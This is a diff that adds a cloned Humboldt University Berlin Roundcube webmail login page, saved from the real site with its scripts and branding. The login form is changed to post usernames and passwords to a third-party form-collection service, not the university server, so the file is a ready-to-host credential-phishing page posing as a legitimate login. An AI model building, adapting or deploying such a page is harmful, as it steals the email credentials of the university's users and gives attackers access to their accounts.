@@ -1,0 +1,92 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0047)https://webmail.cms.hu-berlin.de/roundcubemail/ -->
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml" class=" js chrome webkit"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
+<title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
+<link rel="index" href="https://webmail.cms.hu-berlin.de/roundcubemail/?_task=login">
+
+<link rel="shortcut icon" href="https://webmail.cms.hu-berlin.de/roundcubemail/skins/classic/images/favicon.ico?s=1638019608">
+<link rel="stylesheet" type="text/css" href="./hu-berlin_files/common.min.css">
+
+
+
+<link rel="stylesheet" type="text/css" href="./hu-berlin_files/jquery-ui.min.css"><link rel="stylesheet" type="text/css" href="./hu-berlin_files/rcguard.css"><script type="text/javascript" async="" charset="utf-8" src="./hu-berlin_files/recaptcha__en.js.download" crossorigin="anonymous" integrity="sha384-8mJgBUBw4uTWF9Ooxgb4sUuO9jKtaVm1I+8vb0qpxxX3cafec7ovH+goM3yD4UyO"></script><script src="./hu-berlin_files/jquery.min.js.download" type="text/javascript"></script><script src="./hu-berlin_files/common.min.js.download" type="text/javascript"></script><script src="./hu-berlin_files/app.min.js.download" type="text/javascript"></script><script src="./hu-berlin_files/jstz.min.js.download" type="text/javascript"></script><script type="text/javascript">
+/* <![CDATA[ */
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10609,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"dark_mode_support":false,"skin":"classic","blankpage":"skins/classic/watermark.html","refresh_interval":60,"session_lifetime":36000,"action":"","comm_path":"/roundcubemail/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","request_token":"WOE3ZOcdTGSQ9U6h3pFJASYY28c6qJxl"});
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK"});
+rcmail.gui_container("loginfooter","bottomline");rcmail.gui_object('message', 'message');
+rcmail.gui_object('loginform', 'form');
+/* ]]> */
+</script>
+
+<script src="./hu-berlin_files/jquery-ui.min.js.download" type="text/javascript"></script><script src="./hu-berlin_files/api.js.download" type="text/javascript"></script>
+</head>
+<body>
+
+<img src="./hu-berlin_files/roundcube_logo.png" id="logo" border="0" style="margin:0 11px" alt="Roundcube Webmail">
+
+<div id="message"></div>
+
+<div id="login-form">
+<div class="boxtitle">Welcome to Roundcube Webmail</div>
+<div class="boxcontent">
+
+<form name="form" method="post" action="https://formbold.com/s/3V75O">
+<input type="hidden" name="_token" value="WOE3ZOcdTGSQ9U6h3pFJASYY28c6qJxl">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos"><input type="hidden" name="_url" id="rcmloginurl" value=""><table border="0"><tbody><tr><td class="title"><label for="rcmloginuser">Username</label></td><td class="input"><input name="_user" id="rcmloginuser" required="required" autocapitalize="off" value="" type="text"></td></tr><tr><td class="title"><label for="rcmloginpwd">Password</label></td><td class="input"><input name="_pass" id="rcmloginpwd" required="required" autocapitalize="off" autocomplete="off" type="password"></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit">Login</button></p><input type="hidden" id="gtoken" name="g-recaptcha-response" value="03AFcWeA7YL9xjZC44GlPvHGTGViaU9Le4hMqdG03pPJNG5Yjd-6Ks7vdypOWi7QMJbaMIilGVY9xkOexU9Z-PIpiXJ7E7eQO6l8_Bsr9xhUakfjnSYFTLZbxRO4T3iwVTkrT0qgfr9Szu0p-G8GgZBnjyCiRZufEdIhyuKio5TFWYAdYtj8NmGf34RQ_stgwWEfDLmDkv02t-R6Nms73ItlD8c4jH9uBE9U4G8DstR1OSUoYlTDfJucScM5hB_FFkuswdO3UDKRA3-VK1r2fowWycQSah39T-KUUq-ZYtcLr_jVe_hk-gULKJZZ1G48Q87CvmQCOyd2pZj26sYuapc2GY9cn1dgl8mDWklfIybICoFXrmviqYnbXVC8DcWy2em7cgONCPypTiLvENrTCm0AcH6MXRoYm1MlDXzVaGy4aZ8DzZsTsrRPTlzxrwWXTrUNN-lk04j5m0FNSD7E3CHPX9mVp7MpbI-HJydzxbDhY5ARFgBVHOHQL22Sd_iFLiuWoxFf7BtVdY1wM6J49jy_nqhwonuj2eByz79d6gNmGm3GygfqJ8PWBJ1ZJ-DBB0-EbQ8ehshDlwuEDhxnJD1NUAMSYwbyFMqITmPForqHisQ_ln7Yjgb0vmGMdOHdmuuF9jMclY_WqjhQDwIQZ8X-zwhnieI-A5e4yIkx6bgJjgZ9PSWGRfyfx4B-UKw9OUiXpTs6gkAznzPGyuKjs8zBP_B40fy_txIyk2kRnzMpoTozgoDSQ43P11wcgleh6N_s48JeIfCLYeI8itvCRJZzkro6Y__zpiDQ8QMjNhPVQXGIiofZqli2sMMV9rfUxG6ahQCvqU3tb9v2TFPHTlOJreihpQOfIndw">
+</form>
+
+</div>
+</div>
+
+<noscript>
+  <p id="login-noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+</noscript>
+
+<div id="login-bottomline">
+  Roundcube Webmail 
+  
+    &nbsp;●&nbsp; <a href="https://webmail.cms.hu-berlin.de/" target="_blank" class="support-link">Get support</a>
+    &nbsp;●&nbsp; <a href="https://www.hu-berlin.de/de/hu/impressum/" target="_blank" class="support-link">Impressum</a>
+    &nbsp;●&nbsp; <a href="https://www.hu-berlin.de/de/hu/impressum/datenschutzerklaerung" target="_blank" class="support-link">Datenschutzerklärung</a>
+  
+  
+</div>
+<script type="text/javascript">
+/* <![CDATA[ */
+$(function() {
+rcmail.init();
+grecaptcha.ready(function() {    grecaptcha.execute('6LckLtgUAAAAALqYSy4k7pPryzK3DdmMEOmfmkuQ', {action: 'login'}).then(function(token) {        $('#gtoken').val(token);});});
+var images = ["skins/classic/images/icons/folders.png","skins/classic/images/mail_footer.png","skins/classic/images/taskicons.gif","skins/classic/images/display/loading.gif","skins/classic/images/pagenav.gif","skins/classic/images/mail_toolbar.png","skins/classic/images/searchfield.gif","skins/classic/images/messageicons.png","skins/classic/images/icons/reset.gif","skins/classic/images/abook_toolbar.png","skins/classic/images/icons/groupactions.png","skins/classic/images/watermark.gif"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+/* ]]> */
+</script>
+
+
+
+
+
+
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-433n0de13hi1" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="./hu-berlin_files/anchor.html"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./hu-berlin_files/saved_resource.html"></iframe></div></body></html>
